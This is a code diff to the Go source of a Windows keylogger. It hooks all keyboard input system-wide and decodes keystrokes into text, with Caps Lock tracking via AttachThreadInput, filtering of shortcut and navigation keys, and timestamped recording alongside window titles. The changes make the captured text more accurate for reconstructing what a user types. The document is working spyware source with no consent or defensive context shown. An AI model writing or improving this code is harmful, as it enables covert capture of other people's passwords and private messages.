@@ -20,7 +20,9 @@ import (
 const (
 	whKeyboardLL  = 13
 	wmKeyDown     = 0x0100
+	wmKeyUp       = 0x0101
 	wmSysKeyDown  = 0x0104
+	wmSysKeyUp    = 0x0105
 	wmQuit        = 0x0012
 	hcAction      = 0
 	cfUnicodeText = 13
@@ -29,16 +31,22 @@ const (
 
 	hookHealth = 3 * time.Second
 
-	toUnicodeNoStateChange = 0x04
-
+	vkBack    = 0x08
+	vkTab     = 0x09
+	vkReturn  = 0x0D
+	vkShift   = 0x10
 	vkControl = 0x11
+	vkMenu    = 0x12
+	vkCapital = 0x14
+	vkEscape  = 0x1B
+	vkLWin    = 0x5B
+	vkRWin    = 0x5C
 )
 
 var modifierVKs = [...]uint32{
 	0x10, 0xA0, 0xA1,
 	0x11, 0xA2, 0xA3,
 	0x12, 0xA4, 0xA5,
-	0x14,
 }
 
 var (
@@ -56,6 +64,7 @@ var (
 	procGetWindowThreadProcessID = user32.NewProc("GetWindowThreadProcessId")
 	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
 	procGetAsyncKeyState         = user32.NewProc("GetAsyncKeyState")
+	procAttachThreadInput        = user32.NewProc("AttachThreadInput")
 )
 
 type KeyEvent struct {
@@ -112,6 +121,7 @@ type Keylogger struct {
 	hook     uintptr
 	threadID uint32
 	layout   uintptr
+	caps     bool
 	window   windowInfo
 	running  bool
 	wanted   bool
@@ -147,55 +157,54 @@ func (k *Keylogger) record(kb *kbdllHookStruct) {
 		return
 	}
 
-	event := KeyEvent{Timestamp: time.Now().UTC(), Vk: kb.VkCode}
+	if suppressKey() {
+		return
+	}
 
-	if ctrlDown() {
-		if label, ok := ctrlLabel(kb.VkCode); ok {
-			event.IsSpecial = true
-			event.Label = label
-			sink.Append(event)
-			return
+	if kb.VkCode == vkCapital {
+		k.mu.Lock()
+		k.caps = !k.caps
+		k.mu.Unlock()
+		return
+	}
+
+	switch kb.VkCode {
+	case vkBack:
+		sink.Append(KeyEvent{Timestamp: time.Now().UTC(), Vk: vkBack, IsSpecial: true})
+		return
+	case vkReturn:
+		sink.Append(KeyEvent{Timestamp: time.Now().UTC(), Vk: vkReturn, Rune: '\n'})
+		return
+	}
+
+	if silentKey(kb.VkCode) {
+		return
+	}
+
+	text, ok := k.decode(kb)
+	if !ok || text == "" {
+		return
+	}
+	at := time.Now().UTC()
+	for _, r := range text {
+		if r == '\r' || r == '\n' || r == '\t' {
+			continue
 		}
-		if label, ok := specialLabel(kb.VkCode); ok && ctrlComposable(label) {
-			event.IsSpecial = true
-			event.Label = ctrlCombo(label)
-			sink.Append(event)
-			return
-		}
+		sink.Append(KeyEvent{Timestamp: at, Vk: kb.VkCode, Rune: r})
 	}
-
-	if label, ok := specialLabel(kb.VkCode); ok {
-		event.IsSpecial = true
-		event.Label = label
-		sink.Append(event)
-		return
-	}
-
-	if isModifierKey(kb.VkCode) {
-		return
-	}
-
-	if r, ok := k.decode(kb); ok && r != 0 {
-		event.Rune = r
-		sink.Append(event)
-		return
-	}
-
-	event.IsSpecial = true
-	event.Label = fmt.Sprintf("[VK:0x%02X]", kb.VkCode)
-	sink.Append(event)
 }
 
-func (k *Keylogger) decode(kb *kbdllHookStruct) (rune, bool) {
-	var state [256]byte
-	if res, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&state[0]))); res == 0 {
-		return 0, false
-	}
-	fillModifierState(&state)
-
+func (k *Keylogger) decode(kb *kbdllHookStruct) (string, bool) {
 	k.mu.Lock()
 	layout := k.layout
+	caps := k.caps
 	k.mu.Unlock()
+
+	var state [256]byte
+	if res, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&state[0]))); res == 0 {
+		return "", false
+	}
+	fillModifierState(&state, caps)
 
 	var buf [8]uint16
 	n, _, _ := procToUnicodeEx.Call(
@@ -204,130 +213,94 @@ func (k *Keylogger) decode(kb *kbdllHookStruct) (rune, bool) {
 		uintptr(unsafe.Pointer(&state[0])),
 		uintptr(unsafe.Pointer(&buf[0])),
 		uintptr(len(buf)),
-		uintptr(toUnicodeNoStateChange),
+		0,
 		layout,
 	)
 	if int32(n) <= 0 {
-		return 0, false
+		return "", false
 	}
 
-	r := rune(buf[0])
-	if utf16.IsSurrogate(r) && int(n) > 1 {
-		r = utf16.DecodeRune(r, rune(buf[1]))
-	}
-	return r, true
+	units := buf[:n]
+	text := string(utf16.Decode(units))
+	return text, text != ""
 }
 
-func fillModifierState(state *[256]byte) {
+func fillModifierState(state *[256]byte, caps bool) {
 	for _, vk := range modifierVKs {
+		state[vk] &^= 0x81
+	}
+	state[vkCapital] &^= 0x81
+
+	shift := false
+	control := false
+	alt := false
+	for _, vk := range []uint32{0x10, 0xA0, 0xA1} {
 		res, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
-		value := int32(res)
-		if value&0x8000 != 0 {
-			state[vk] |= 0x80
-		}
-		if value&0x0001 != 0 {
-			state[vk] |= 0x01
+		if int32(res)&0x8000 != 0 {
+			shift = true
 		}
 	}
-	if state[0xA2]&0x80 != 0 || state[0xA3]&0x80 != 0 {
-		state[0x11] |= 0x80
+	for _, vk := range []uint32{0x11, 0xA2, 0xA3} {
+		res, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
+		if int32(res)&0x8000 != 0 {
+			control = true
+		}
 	}
-	if state[0xA0]&0x80 != 0 || state[0xA1]&0x80 != 0 {
+	for _, vk := range []uint32{0x12, 0xA4, 0xA5} {
+		res, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
+		if int32(res)&0x8000 != 0 {
+			alt = true
+		}
+	}
+
+	if shift {
 		state[0x10] |= 0x80
 	}
-	if state[0xA4]&0x80 != 0 || state[0xA5]&0x80 != 0 {
+	if control {
+		state[0x11] |= 0x80
+	}
+	if alt {
 		state[0x12] |= 0x80
+	}
+	if caps {
+		state[vkCapital] |= 0x01
 	}
 }
 
-func ctrlDown() bool {
-	res, _, _ := procGetAsyncKeyState.Call(vkControl)
+func suppressKey() bool {
+	if down(0x5B) || down(0x5C) {
+		return true
+	}
+	if down(0xA5) {
+		return false
+	}
+	return down(0x11) || down(0xA2) || down(0xA3) || down(0x12) || down(0xA4)
+}
+
+func down(vk uint32) bool {
+	res, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
 	return int32(res)&0x8000 != 0
 }
 
-func ctrlLabel(vk uint32) (string, bool) {
+func silentKey(vk uint32) bool {
 	switch vk {
-	case 0x43:
-		return "[CTRL+C]", true
-	case 0x56:
-		return "[CTRL+V]", true
-	case 0x58:
-		return "[CTRL+X]", true
-	case 0x41:
-		return "[CTRL+A]", true
-	case 0x5A:
-		return "[CTRL+Z]", true
-	case 0x53:
-		return "[CTRL+S]", true
-	}
-	return "", false
-}
-
-func specialLabel(vk uint32) (string, bool) {
-	switch vk {
-	case 0x0D:
-		return "[ENTER]", true
-	case 0x09:
-		return "[TAB]", true
-	case 0x08:
-		return "[BKSP]", true
-	case 0x2E:
-		return "[DEL]", true
-	case 0x1B:
-		return "[ESC]", true
-	case 0x5B, 0x5C:
-		return "[WIN]", true
-	case 0x25:
-		return "[LEFT]", true
-	case 0x26:
-		return "[UP]", true
-	case 0x27:
-		return "[RIGHT]", true
-	case 0x28:
-		return "[DOWN]", true
-	case 0x24:
-		return "[HOME]", true
-	case 0x23:
-		return "[END]", true
-	case 0x21:
-		return "[PGUP]", true
-	case 0x22:
-		return "[PGDN]", true
-	case 0x2D:
-		return "[INS]", true
-	case 0x2C:
-		return "[PRTSC]", true
-	case 0x5D:
-		return "[MENU]", true
-	case 0x13:
-		return "[PAUSE]", true
-	case 0x90:
-		return "[NUMLOCK]", true
-	case 0x91:
-		return "[SCROLL]", true
-	}
-	if vk >= 0x70 && vk <= 0x7B {
-		return fmt.Sprintf("[F%d]", vk-0x6F), true
-	}
-	return "", false
-}
-
-func ctrlComposable(label string) bool {
-	return label != "" && label[0] == '[' && !strings.HasPrefix(label, "[VK:")
-}
-
-func ctrlCombo(label string) string {
-	return "[CTRL+" + strings.TrimSuffix(strings.TrimPrefix(label, "["), "]") + "]"
-}
-
-func isModifierKey(vk uint32) bool {
-	switch vk {
-	case 0x10, 0x11, 0x12,
-		0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5,
-		0x14:
+	case vkShift, 0xA0, 0xA1,
+		vkControl, 0xA2, 0xA3,
+		vkMenu, 0xA4, 0xA5,
+		vkCapital,
+		vkTab, vkEscape,
+		vkLWin, vkRWin, 0x5D,
+		0x25, 0x26, 0x27, 0x28,
+		0x24, 0x23, 0x21, 0x22,
+		0x2D, 0x2E, 0x2C, 0x13,
+		0x90, 0x91,
+		0xAD, 0xAE, 0xAF:
 		return true
 	}
-	return false
+	if vk >= 0x70 && vk <= 0x87 {
+		return true
+	}
+	return vk >= 0xA6 && vk <= 0xB7
 }
 
 func (k *Keylogger) Start() error {
@@ -478,6 +451,32 @@ func sameWindowTitle(a, b string) bool {
 	return strings.TrimPrefix(a, "*") == strings.TrimPrefix(b, "*")
 }
 
+func initCapsLock() bool {
+	myTid := uintptr(windows.GetCurrentThreadId())
+	var target uintptr
+	attached := false
+
+	if hwnd, _, _ := procGetForegroundWindow.Call(); hwnd != 0 {
+		var pid uint32
+		tid, _, _ := procGetWindowThreadProcessID.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
+		target = tid
+		if target != 0 && target != myTid {
+			if res, _, _ := procAttachThreadInput.Call(myTid, target, 1); res != 0 {
+				attached = true
+			}
+		}
+	}
+	if attached {
+		defer func() { _, _, _ = procAttachThreadInput.Call(myTid, target, 0) }()
+	}
+
+	var state [256]byte
+	if res, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&state[0]))); res == 0 {
+		return false
+	}
+	return state[vkCapital]&0x01 != 0
+}
+
 func (k *Keylogger) install() error {
 	ready := make(chan error, 1)
 
@@ -492,9 +491,12 @@ func (k *Keylogger) install() error {
 		}
 
 		done := make(chan struct{})
+		caps := initCapsLock()
+
 		k.mu.Lock()
 		k.hook = hook
 		k.threadID = windows.GetCurrentThreadId()
+		k.caps = caps
 		k.running = true
 		k.done = done
 		wanted := k.wanted
